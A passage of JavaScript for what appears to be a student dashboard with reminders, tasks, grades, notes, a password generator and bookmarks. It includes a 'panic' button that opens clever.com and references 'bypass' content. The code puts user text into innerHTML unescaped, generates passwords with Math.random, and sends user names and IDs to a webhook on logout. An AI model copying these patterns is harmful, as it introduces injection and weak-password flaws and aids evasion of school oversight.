          globalState.animationsEnabled = localStorage.getItem('enableAnimations') !== 'false';
          globalState.notificationsEnabled = localStorage.getItem('enableNotifications') !== 'false';
          globalState.notificationSoundEnabled = localStorage.getItem('enableNotificationSound') !== 'false';
          globalState.notificationVolume = parseFloat(localStorage.getItem('notificationVolume') || '0.5');
          globalState.disableLongNotifications = localStorage.getItem('disableLongNotifications') === 'true';

          // Update UI controls for settings
          const enableAnimationsCheckbox = document.getElementById('enableAnimations');
          if (enableAnimationsCheckbox) enableAnimationsCheckbox.checked = globalState.animationsEnabled;
          const enableNotificationsCheckbox = document.getElementById('enableNotifications');
          if (enableNotificationsCheckbox) enableNotificationsCheckbox.checked = globalState.notificationsEnabled;
          const enableNotificationSoundCheckbox = document.getElementById('enableNotificationSound');
          if (enableNotificationSoundCheckbox) enableNotificationSoundCheckbox.checked = globalState.notificationSoundEnabled;
          const notificationVolumeSlider = document.getElementById('notificationVolume');
          if (notificationVolumeSlider) {
              notificationVolumeSlider.value = globalState.notificationVolume * 100;
              document.getElementById('notificationVolumeValue').textContent = `${notificationVolumeSlider.value}%`;
          }
          const disableLongNotificationsCheckbox = document.getElementById('disableLongNotifications');
          if (disableLongNotificationsCheckbox) disableLongNotificationsCheckbox.checked = globalState.disableLongNotifications;
      },
      saveSettings: function() {
          localStorage.setItem('theme', globalState.theme);
          localStorage.setItem('enableAnimations', globalState.animationsEnabled);
          localStorage.setItem('enableNotifications', globalState.notificationsEnabled);
          localStorage.setItem('enableNotificationSound', globalState.notificationSoundEnabled);
          localStorage.setItem('notificationVolume', globalState.notificationVolume);
          localStorage.setItem('disableLongNotifications', globalState.disableLongNotifications);
          logAction("Settings saved successfully.", "success");
      },
      // Apply theme to body
      applyTheme: function(theme) {
          const body = document.body;
          body.classList.remove('dark-theme', 'light-theme');
          body.classList.add(theme);
          globalState.theme = theme; // Update global state
          // Update theme toggle button text
          const themeBtn = document.getElementById('themeToggle');
          if (themeBtn) themeBtn.innerText = (theme === 'light-theme') ? 'üåô Dark Mode' : '‚òÄÔ∏è Light Mode';
          
          if(globalState.animationsEnabled){
            body.style.transition = 'background-color var(--color-transition), color var(--color-transition)';
          } else {
            body.style.transition = 'none'; // Disable transition if animations are off
          }
      },
      
      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        const sessionTimeElem = document.getElementById('sessionTime');
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          if (sessionTimeElem) sessionTimeElem.innerText = `‚è≥ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        setInterval(updateSessionTime, 1000);
      },
      
      // Initialize real-time clock
      initClock: function() {
        const realTimeClockElem = document.getElementById('realTimeClock');
        const realDateElem = document.getElementById('realDate');
        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          if (realTimeClockElem) realTimeClockElem.innerText = 'üïí ' + timeStr;
          if (realDateElem) realDateElem.innerText = 'üìÖ ' + dateStr;
        }
        
        updateClock();
        setInterval(updateClock, 1000);
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        if (!calendar) return;
        calendar.innerHTML = '';
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          div.style.fontWeight = 'bold';
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
        logAction("Calendar updated.");
      },
      
      // Initialize theme toggle
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        if (!themeBtn) return;
        themeBtn.addEventListener('click', () => {
          const newTheme = document.body.classList.contains('light-theme') ? 'dark-theme' : 'light-theme';
          this.applyTheme(newTheme);
          this.saveSettings(); // Save theme change
          logAction(`Switched to ${newTheme === 'light-theme' ? 'Light' : 'Dark'} Mode`, "default");
        });
      },
      
      // Initialize common buttons
      initButtons: function() {
        document.getElementById('panicBtn')?.addEventListener('click', () => {
          window.open('https://clever.com', '_blank');
          logAction("Panic button activated. Redirecting to Clever.", "warning");
        });

        document.getElementById('restartBtn')?.addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)? This will erase unsaved data not stored in localStorage.')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Refresh to restart.</div>`;
            logAction("Page killed (simulated restart).", "error");
          }
        });

        document.getElementById('fixIssuesBtn')?.addEventListener('click', () => {
          notificationSystem.info('Running diagnostics...\nNo critical issues found. Your dashboard is running smoothly!', 4000);
          logAction("Fix Issues button pressed. Diagnostics ran.", "success");
        });
        
        document.getElementById('fullScreenBtn')?.addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().then(() => {
                logAction("Full Screen mode enabled.", "default");
            }).catch(err => {
              notificationSystem.error(`Error attempting to enable full-screen mode: ${err.message}`);
            });
          } else {
            document.exitFullscreen().then(() => {
                logAction("Full Screen mode exited.", "default");
            });
          }
        });
        
        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn')?.addEventListener('click', () => {
          if (zoomLevel < maxZoom) {
            zoomLevel = parseFloat((zoomLevel + zoomStep).toFixed(1)); // Fix float precision
            document.body.style.zoom = zoomLevel;
            logAction(`Zoomed In. Current level: ${Math.round(zoomLevel * 100)}%`, "default");
          } else {
            notificationSystem.warning("Maximum zoom level reached.", 2000);
          }
        });

        document.getElementById('zoomOutBtn')?.addEventListener('click', () => {
          if (zoomLevel > minZoom) {
            zoomLevel = parseFloat((zoomLevel - zoomStep).toFixed(1)); // Fix float precision
            document.body.style.zoom = zoomLevel;
            logAction(`Zoomed Out. Current level: ${Math.round(zoomLevel * 100)}%`, "default");
          } else {
            notificationSystem.warning("Minimum zoom level reached.", 2000);
          }
        });

        document.getElementById('toggleSectionsBtn')?.addEventListener('click', (event) => {
            const mainGrid = document.getElementById('mainGrid');
            if (mainGrid) {
                mainGrid.classList.toggle('hidden');
                event.target.innerText = mainGrid.classList.contains('hidden') ? '‚¨áÔ∏è Show Main Panels' : '‚¨ÜÔ∏è Toggle Main Panels';
                logAction(`Toggled main dashboard sections.`, "default");
            }
        });
        
        document.getElementById('logoutBtn')?.addEventListener('click', () => {
            if (confirm('Are you sure you want to log out?')) {
                // Clear any session-specific data if needed
                localStorage.removeItem('loggedInUser');
                localStorage.removeItem('loggedInID');
                
                // Simulate session logging data (mock data for now)
                const logoutTime = new Date().toISOString();
                const sessionDuration = "2h 30m"; // Replace with actual calculated duration
                const mockSessionData = {
                    user: {
                        name: document.getElementById('loggedInUser').textContent,
                        username: document.getElementById('loggedInUser').textContent,
                        userID: document.getElementById('loggedInID').textContent
                    },
                    loginTime: loginTimeGlobal, // From login system
                    logoutTime: logoutTime,
                    sessionDuration: sessionDuration,
                    pagesVisited: [], // Track this if actual page routing
                    actionsPerformed: ["Logged out"],
                    errorsEncountered: [],
                    warnings: [],
                    roleChanges: [],
                    permissionChanges: [],
                    lastActivityTime: new Date().toISOString(),
                    numberOfClicks: 0, // Track this globally
                    numberOfFormSubmissions: 0, // Track this globally
                    idleTime: "0s", // Calculate actual idle time
                    activeTime: "0s", // Calculate actual active time
                    tabFocusTime: "0s" // Calculate actual tab focus time
                };
                
                // Original logout webhook call (assuming `webhookUrls` is accessible globally)
                sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(mockSessionData)).then(() => {
                    logAction("Logged out successfully. Redirecting to login...", "success");
                    // Delay refresh to allow webhook to send
                    setTimeout(() => window.location.reload(), 1500);
                });
            }
        });

        // Add event listeners for notifications on ALL dashboard buttons
        document.querySelectorAll('.quick-bar button, .quick-panel-buttons button, .info-panel a, .info-panel button, #canvasControls button')
            .forEach(button => {
                if (!button.id.startsWith('notesCanvas') && !button.onclick) { // Avoid double notification on buttons with inline onclicks for now
                    button.addEventListener('click', (event) => {
                        let text = event.target.innerText.trim();
                        // For links, text content might be too short
                        if (event.target.tagName === 'A' && !text) {
                            text = event.target.textContent.trim();
                        }
                        // Shorten generic "Coming Soon" or other placeholder messages if too long
                        if (text.length > 50) text = text.substring(0, 47) + "...";
                        
                        logAction(`Button pressed: "${text}"`, "default");
                    });
                }
            });
      },
      
      // Initialize canvas
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid'); // Keep existing logic for grid toggle
        const updatesNotifications = document.getElementById('updatesNotifications'); // Toggle this too

        notesBtn?.addEventListener('click', () => {
          mainGrid.classList.add('hidden'); // Use hidden class
          updatesNotifications.classList.add('hidden'); // Also hide updates/notifications boxes
          canvasContainer.style.display = 'block';
          this.clearAndHideAllPanels(); // Ensure all info panels are hidden
          logAction("Canvas Notes opened.", "default");
        });

        document.getElementById('closeCanvasBtn')?.addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.classList.remove('hidden'); // Show grid again
          updatesNotifications.classList.remove('hidden'); // Show updates/notifications again
          logAction("Canvas Notes closed.", "default");
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const canvas = document.getElementById('notesCanvas');
        if (!canvas) { // Exit if canvas is not present for some reason
            console.error("Notes Canvas not found.");
            return;
        }
        const ctx = canvas.getContext('2d');

        // Restore canvas from localStorage if exists
        const savedCanvas = localStorage.getItem('notesCanvasData');
        if (savedCanvas) {
            const img = new Image();
            img.onload = () => ctx.drawImage(img, 0, 0);
            img.src = savedCanvas;
        } else {
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        let drawing = false;

        function saveCanvasState() {
            localStorage.setItem('notesCanvasData', canvas.toDataURL('image/png'));
        }

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          let clientX, clientY;
          if (evt.touches && evt.touches.length > 0) {
              clientX = evt.touches[0].clientX;
              clientY = evt.touches[0].clientY;
          } else {
              clientX = evt.clientX;
              clientY = evt.clientY;
          }
          return {
            x: clientX - rect.left,
            y: clientY - rect.top
          };
        }

        canvas.addEventListener('mousedown', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = '#ff914d';
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = '#ff914d';
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            if (drawing) { // Only save if drawing actually occurred
                drawing = false;
                saveCanvasState();
            }
          });
        });

        clearCanvasBtn?.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          saveCanvasState(); // Save empty canvas
          logAction("Canvas cleared.", "warning");
        });

        document.getElementById('screenshotBtn')?.addEventListener('click', () => {
          const elementToCapture = document.body; 
          html2canvas(elementToCapture).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            logAction("Screenshot taken.", "success");
          });
        });
        
        document.getElementById('exportNotesBtn')?.addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          logAction("Canvas exported as PNG.", "success");
        });
      },
      
      // Hide all panels initially, or show a default "Welcome" one if needed
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.classList.remove('active');
        });
        document.querySelectorAll('.ipad-content, .bypass-content').forEach(content => {
          content.style.display = 'none';
        });
      },

      clearAndHideAllPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
            if (panel.classList.contains('active')) {
                panel.classList.remove('active');
            }
        });
        document.getElementById('canvasContainer').style.display = 'none';
        document.getElementById('mainGrid').classList.remove('hidden');
        document.getElementById('updatesNotifications').classList.remove('hidden');
        this._activePanel = null;
      },
      
      // Panel toggle functions
      togglePanel: function(panelId) {
        this.clearAndHideAllPanels(); // Ensure previous panels/canvas are closed

        const panel = document.getElementById(panelId);
        if (panel && this._activePanel !== panelId) {
            panel.classList.add('active'); // Activate with animation
            this._activePanel = panelId;
            logAction(`Opened "${panelId.replace(/Panel/,'').replace(/([A-Z])/g, ' $1').trim()}" panel.`, "default");

            // Special init calls for specific panels when opened for the first time
            if (panelId === 'reminderPanel') this.reminderSystem.renderReminders();
            if (panelId === 'taskManagerPanel') this.taskManager.renderTasks();
            if (panelId === 'courseProgressPanel') this.courseProgress.renderProgress();
            if (panelId === 'quickNotesPanel') this.quickNotes.loadNotes();
            if (panelId === 'passwordGeneratorPanel') this.passwordGenerator.generate();
            if (panelId === 'personalizedLinksPanel') this.personalizedLinks.renderLinks();
            if (panelId === 'timezoneConverterPanel') this.timezoneConverter.populateTimezones();
            if (panelId === 'settingsPanel') this.settingsManager.renderSettings();
        } else if (this._activePanel === panelId) {
            // Panel is already active, close it
            this.clearAndHideAllPanels();
            logAction(`Closed "${panelId.replace(/Panel/,'').replace(/([A-Z])/g, ' $1').trim()}" panel.`, "default");
        }
      },
      
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        logAction(`Viewed iPad "${contentId}" content.`, "default");
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        logAction(`Viewed "${contentId}" bypass content.`, "default");
      },

      // Motivation quote rotation
      rotateMotivationQuote: function() {
        const motivationBox = document.getElementById('motivationBox');
        if (!motivationBox) return;
        let currentIndex = 0;
        const quoteElement = motivationBox.querySelector('.motivation-quote');

        function setQuote(quote) {
          quoteElement.style.opacity = '0';
          quoteElement.style.transform = 'translateY(10px)';
          setTimeout(() => {
            quoteElement.textContent = quote;
            quoteElement.style.opacity = '1';
            quoteElement.style.transform = 'translateY(0)';
          }, 500); // Wait for fade-out then set new quote
        }

        setQuote(this._quotes[currentIndex]);

        setInterval(() => {
          currentIndex = (currentIndex + 1) % this._quotes.length;
          setQuote(this._quotes[currentIndex]);
        }, 15000); // Change every 15 seconds
      },

      // --- NEW FEATURE INITIALIZATIONS ---
      initNewFeatures: function() {
        this.reminderSystem.init();
        this.taskManager.init();
        this.courseProgress.init();
        this.quickNotes.init();
        this.passwordGenerator.init();
        this.personalizedLinks.init();
        this.timezoneConverter.init();
        this.settingsManager.init();
      },

      // --- Reminder System Module ---
      reminderSystem: {
        parent: dashboard,
        init: function() {
          this.loadReminders();
          document.getElementById('reminderForm')?.addEventListener('submit', (e) => {
            e.preventDefault();
            this.addReminder();
          });
          document.getElementById('reminders')?.addEventListener('click', (e) => {
            if (e.target.classList.contains('delete-btn')) {
              this.deleteReminder(e.target.dataset.id);
            }
          });
        },
        loadReminders: function() {
          this.parent._reminders = JSON.parse(localStorage.getItem('dashboardReminders') || '[]');
          this.parent._reminders.forEach(r => {
            // Ensure dateTime is treated as string for input compatibility
            if (r.dateTime instanceof Date) r.dateTime = r.dateTime.toISOString().slice(0, 16);
          });
          this.renderReminders();
        },
        saveReminders: function() {
          localStorage.setItem('dashboardReminders', JSON.stringify(this.parent._reminders));
        },
        addReminder: function() {
          const textInput = document.getElementById('reminderText');
          const dateTimeInput = document.getElementById('reminderDateTime');
          if (textInput?.value && dateTimeInput?.value) {
            const newReminder = {
              id: Date.now().toString(),
              text: textInput.value,
              dateTime: dateTimeInput.value,
              created: new Date().toISOString()
            };
            this.parent._reminders.push(newReminder);
            this.saveReminders();
            this.renderReminders();
            textInput.value = '';
            dateTimeInput.value = '';
            logAction(`Reminder "${newReminder.text}" added.`, "success");
          } else {
            notificationSystem.warning("Please fill both reminder text and date/time.", 2500);
          }
        },
        deleteReminder: function(id) {
          if (confirm('Are you sure you want to delete this reminder?')) {
            const index = this.parent._reminders.findIndex(r => r.id === id);
            if (index !== -1) {
              const deletedReminder = this.parent._reminders.splice(index, 1)[0];
              this.saveReminders();
              this.renderReminders();
              logAction(`Reminder "${deletedReminder.text}" deleted.`, "warning");
            }
          }
        },
        renderReminders: function() {
          const reminderList = document.getElementById('reminders');
          if (!reminderList) return;
          reminderList.innerHTML = '';
          const now = new Date();
          
          this.parent._reminders.sort((a, b) => new Date(a.dateTime) - new Date(b.dateTime)).forEach(reminder => {
            const li = document.createElement('li');
            const reminderDate = new Date(reminder.dateTime);
            const isPastDue = reminderDate < now;
            
            li.innerHTML = `
              <span>
                <strong>${reminder.text}</strong><br>
                Due: ${reminderDate.toLocaleString()}
              </span>
              <div class="reminder-actions">
                <button class="delete-btn" data-id="${reminder.id}">Delete</button>
              </div>
            `;
            if (isPastDue) {
                li.classList.add('past-due');
            }
            reminderList.appendChild(li);
          });
        }
      },

      checkRemindersLoop: function() {
        setInterval(() => {
          const now = new Date();
          this._reminders.forEach(reminder => {
            const reminderDate = new Date(reminder.dateTime);
            const fiveMinutesBefore = new Date(reminderDate.getTime() - 5 * 60 * 1000); // 5 minutes before
            // If now is within 5 minutes *before* reminder and reminder not yet due
            if (now >= fiveMinutesBefore && now < reminderDate) {
              if (!reminder.notifiedPre) { // Only notify once
                notificationSystem.warning(`Reminder: "${reminder.text}" is coming up in ${Math.ceil((reminderDate - now) / 60000)} minutes!`, 5000);
                reminder.notifiedPre = true; // Mark as pre-notified
                this.reminderSystem.saveReminders(); // Save the notified state
              }
            } else if (now >= reminderDate && !reminder.notifiedDue) { // If it's now due
              notificationSystem.error(`üö® REMINDER DUE NOW: "${reminder.text}"`, 7000);
              reminder.notifiedDue = true; // Mark as due-notified
              this.reminderSystem.saveReminders();
            }
          });
          this.reminderSystem.renderReminders(); // Re-render to update 'past-due' status visually
        }, 10000); // Check every 10 seconds
      },

      // --- Task Manager Module ---
      taskManager: {
        parent: dashboard,
        init: function() {
          this.loadTasks();
          document.getElementById('addTaskBtn')?.addEventListener('click', () => this.addTask());
          document.getElementById('taskInput')?.addEventListener('keypress', (e) => {
              if (e.key === 'Enter') this.addTask();
          });
          document.getElementById('tasks')?.addEventListener('click', (e) => {
            if (e.target.classList.contains('delete-btn')) {
              this.deleteTask(e.target.dataset.id);
            } else if (e.target.classList.contains('complete-btn')) {
              this.toggleTaskCompletion(e.target.dataset.id);
            }
          });
        },
        loadTasks: function() {
          this.parent._tasks = JSON.parse(localStorage.getItem('dashboardTasks') || '[]');
          this.renderTasks();
        },
        saveTasks: function() {
          localStorage.setItem('dashboardTasks', JSON.stringify(this.parent._tasks));
        },
        addTask: function() {
          const taskInput = document.getElementById('taskInput');
          if (taskInput?.value.trim()) {
            const newTask = {
              id: Date.now().toString(),
              text: taskInput.value.trim(),
              completed: false,
              created: new Date().toISOString()
            };
            this.parent._tasks.push(newTask);
            this.saveTasks();
            this.renderTasks();
            taskInput.value = '';
            logAction(`Task "${newTask.text}" added.`, "success");
          } else {
            notificationSystem.warning("Task description cannot be empty.", 2500);
          }
        },
        deleteTask: function(id) {
          if (confirm('Are you sure you want to delete this task?')) {
            const index = this.parent._tasks.findIndex(t => t.id === id);
            if (index !== -1) {
              const deletedTask = this.parent._tasks.splice(index, 1)[0];
              this.saveTasks();
              this.renderTasks();
              logAction(`Task "${deletedTask.text}" deleted.`, "warning");
            }
          }
        },
        toggleTaskCompletion: function(id) {
            const task = this.parent._tasks.find(t => t.id === id);
            if (task) {
                task.completed = !task.completed;
                this.saveTasks();
                this.renderTasks();
                logAction(`Task "${task.text}" marked as ${task.completed ? 'completed' : 'pending'}.`, "default");
            }
        },
        renderTasks: function() {
          const taskList = document.getElementById('tasks');
          if (!taskList) return;
          taskList.innerHTML = '';
          if (this.parent._tasks.length === 0) {
            taskList.innerHTML = '<p style="text-align: center;">No tasks yet. Add one!</p>';
            return;
          }
          this.parent._tasks.forEach(task => {
            const li = document.createElement('li');
            li.classList.toggle('completed', task.completed);
            li.innerHTML = `
              <span>${task.text}</span>
              <div class="task-actions">
                <button class="complete-btn" data-id="${task.id}">${task.completed ? 'Uncomplete' : 'Complete'}</button>
                <button class="delete-btn" data-id="${task.id}">Delete</button>
              </div>
            `;
            taskList.appendChild(li);
          });
        }
      },

      // --- Course Progress Tracker Module ---
      courseProgress: {
        parent: dashboard,
        init: function() {
          this.loadProgress();
          document.getElementById('progressForm')?.addEventListener('submit', (e) => {
            e.preventDefault();
            this.addGrade();
          });
        },
        loadProgress: function() {
          this.parent._courses = JSON.parse(localStorage.getItem('dashboardCoursesProgress') || '[]');
          this.renderProgress();
        },
        saveProgress: function() {
          localStorage.setItem('dashboardCoursesProgress', JSON.stringify(this.parent._courses));
        },
        addGrade: function() {
          const courseNameInput = document.getElementById('courseName');
          const assignmentNameInput = document.getElementById('assignmentName');
          const scoreObtainedInput = document.getElementById('scoreObtained');
          const totalScoreInput = document.getElementById('totalScore');

          if (!courseNameInput?.value || !assignmentNameInput?.value || scoreObtainedInput?.value === "" || totalScoreInput?.value === "") {
            notificationSystem.warning("Please fill all fields for course progress.", 2500);
            return;
          }

          const score = parseInt(scoreObtainedInput.value);
          const total = parseInt(totalScoreInput.value);

          let course = this.parent._courses.find(c => c.name.toLowerCase() === courseNameInput.value.toLowerCase());
          if (!course) {
            course = {
              name: courseNameInput.value,
              grades: [],
              id: Date.now().toString()
            };
            this.parent._courses.push(course);
          }

          course.grades.push({
            assignment: assignmentNameInput.value,
            score: score,
            total: total,
            date: new Date().toISOString()
          });

          this.saveProgress();
          this.renderProgress();
          courseNameInput.value = '';
          assignmentNameInput.value = '';
          scoreObtainedInput.value = '';
          totalScoreInput.value = '';
          logAction(`Grade for "${assignmentNameInput.value}" added to ${course.name}.`, "success");
        },
        renderProgress: function() {
          const progressList = document.getElementById('courseProgressList');
          const overallAverageElem = document.getElementById('overallAverage');
          if (!progressList || !overallAverageElem) return;
          progressList.innerHTML = '';
          let totalPoints = 0;
          let totalPossible = 0;

          if (this.parent._courses.length === 0) {
            progressList.innerHTML = '<p style="text-align: center;">No courses tracked yet.</p>';
            overallAverageElem.textContent = 'N/A';
            return;
          }

          this.parent._courses.forEach(course => {
            const courseDiv = document.createElement('div');
            courseDiv.classList.add('course-entry');
            courseDiv.innerHTML = `<h3>${course.name}</h3>`;
            
            let coursePoints = 0;
            let coursePossible = 0;

            if (course.grades.length > 0) {
              course.grades.forEach(grade => {
                coursePoints += grade.score;
                coursePossible += grade.total;
                totalPoints += grade.score;
                totalPossible += grade.total;

                courseDiv.innerHTML += `
                  <div class="progress-item">
                    ${grade.assignment}: ${grade.score}/${grade.total}
                  </div>
                `;
              });
              const courseAvg = (coursePoints / coursePossible) * 100;
              const courseBarWidth = isNaN(courseAvg) ? 0 : courseAvg;
              courseDiv.innerHTML += `
                <div class="progress-item">
                  <strong>Course Average: ${courseAvg.toFixed(2)}%</strong>
                  <div class="bar"><div class="fill" style="width: ${courseBarWidth}%;"></div></div>
                </div>
              `;
            } else {
              courseDiv.innerHTML += '<p>No grades added for this course.</p>';
            }

            progressList.appendChild(courseDiv);
          });

          const overallAvg = (totalPoints / totalPossible) * 100;
          overallAverageElem.textContent = isNaN(overallAvg) ? 'N/A' : `${overallAvg.toFixed(2)}%`;
        }
      },

      // --- Quick Notes & Idea Pad Module ---
      quickNotes: {
        parent: dashboard,
        init: function() {
          const notesArea = document.getElementById('notesArea');
          if (notesArea) {
              notesArea.addEventListener('input', () => this.saveNotes());
              document.getElementById('saveQuickNotesBtn')?.addEventListener('click', () => {
                this.saveNotes();
                notificationSystem.success("Quick notes saved!", 2000);
              });
          }
        },
        loadNotes: function() {
          const notesArea = document.getElementById('notesArea');
          if (notesArea) {
              notesArea.value = localStorage.getItem('dashboardQuickNotes') || '';
              this.parent._quickNotes = notesArea.value; // Sync with internal state
              logAction("Quick Notes loaded.", "default");
          }
        },
        saveNotes: function() {
          const notesArea = document.getElementById('notesArea');
          if (notesArea) {
              localStorage.setItem('dashboardQuickNotes', notesArea.value);
              this.parent._quickNotes = notesArea.value; // Sync with internal state
          }
        }
      },

      // --- Password Generator Module ---
      passwordGenerator: {
        init: function() {
            const generateBtn = document.getElementById('generatePasswordBtn');
            const copyBtn = document.getElementById('copyPasswordBtn');
            const lengthSlider = document.getElementById('passwordLength');
            const lengthValueSpan = document.getElementById('lengthValue');
            const uppercaseCheckbox = document.getElementById('includeUppercase');
            const lowercaseCheckbox = document.getElementById('includeLowercase');
            const numbersCheckbox = document.getElementById('includeNumbers');
            const symbolsCheckbox = document.getElementById('includeSymbols');

            generateBtn?.addEventListener('click', () => this.generate());
            copyBtn?.addEventListener('click', () => this.copyPassword());
            lengthSlider?.addEventListener('input', () => {
                lengthValueSpan.textContent = lengthSlider.value;
                this.generate(); // Regenerate on length change
            });
            // Regenerate on checkbox change
            [uppercaseCheckbox, lowercaseCheckbox, numbersCheckbox, symbolsCheckbox].forEach(checkbox => {
                checkbox?.addEventListener('change', () => this.generate());
            });

            this.generate(); // Generate an initial password when opened
        },
        generate: function() {
            const length = document.getElementById('passwordLength')?.value || 12;
            const includeUppercase = document.getElementById('includeUppercase')?.checked;
            const includeLowercase = document.getElementById('includeLowercase')?.checked;
            const includeNumbers = document.getElementById('includeNumbers')?.checked;
            const includeSymbols = document.getElementById('includeSymbols')?.checked;

            const uppercaseChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const lowercaseChars = "abcdefghijklmnopqrstuvwxyz";
            const numberChars = "0123456789";
            const symbolChars = "!@#$%^&*()-_=+[{]}\\|;:'\",<.>/?`~";

            let allChars = "";
            let generatedPassword = "";

            if (includeUppercase) allChars += uppercaseChars;
            if (includeLowercase) allChars += lowercaseChars;
            if (includeNumbers) allChars += numberChars;
            if (includeSymbols) allChars += symbolChars;

            if (allChars.length === 0) {
                document.getElementById('passwordOutput').textContent = "Select at least one character type!";
                return;
            }

            // Ensure at least one char from each selected type
            if (includeUppercase) generatedPassword += uppercaseChars[Math.floor(Math.random() * uppercaseChars.length)];
            if (includeLowercase) generatedPassword += lowercaseChars[Math.floor(Math.random() * lowercaseChars.length)];
            if (includeNumbers) generatedPassword += numberChars[Math.floor(Math.random() * numberChars.length)];
            if (includeSymbols) generatedPassword += symbolChars[Math.floor(Math.random() * symbolChars.length)];

            for (let i = generatedPassword.length; i < length; i++) {
                generatedPassword += allChars[Math.floor(Math.random() * allChars.length)];
            }

            // Shuffle the password to mix the required characters
            generatedPassword = generatedPassword.split('').sort(() => Math.random() - 0.5).join('');

            document.getElementById('passwordOutput').textContent = generatedPassword;
            logAction(`Password generated with length ${length}.`, "default");
        },
        copyPassword: function() {
            const passwordOutput = document.getElementById('passwordOutput');
            const password = passwordOutput.textContent;
            if (password && password !== "Select at least one character type!") {
                navigator.clipboard.writeText(password).then(() => {
                    notificationSystem.success("Password copied to clipboard!", 2000);
                    logAction("Password copied.", "success");
                }).catch(err => {
                    notificationSystem.error("Failed to copy password: " + err, 3000);
                });
            }
        }
      },

      // --- Personalized Links/Bookmarks Module ---
      personalizedLinks: {
        parent: dashboard,
        init: function() {
          this.loadLinks();
          document.getElementById('addPersonalLinkBtn')?.addEventListener('click', () => this.addLink());
          document.getElementById('personalLinksGrid')?.addEventListener('click', (e) => {
              if (e.target.classList.contains('delete-link-btn')) {
                  e.preventDefault(); // Prevent navigating if it's inside an <a> tag
                  this.deleteLink(e.target.dataset.id);
              }
          });
        },
        loadLinks: function() {
          this.parent._personalizedLinks = JSON.parse(localStorage.getItem('dashboardPersonalLinks') || '[]');
          this.renderLinks();
        },
        saveLinks: function() {
          localStorage.setItem('dashboardPersonalLinks', JSON.stringify(this.parent._personalizedLinks));
        },
        addLink: function() {
            const nameInput = document.getElementById('newLinkName');
            const urlInput = document.getElementById('newLinkURL');
            const name = nameInput?.value.trim();
            const url = urlInput?.value.trim();

            if (!name || !url) {
                notificationSystem.warning("Please enter both a name and a URL for the link.", 3000);
                return;
            }

            // Basic URL validation
            try {
                new URL(url); // Check if it's a valid URL structure
            } catch (_) {
                notificationSystem.error("Invalid URL format. Please enter a valid URL (e.g., https://example.com).", 4000);
                return;
            }

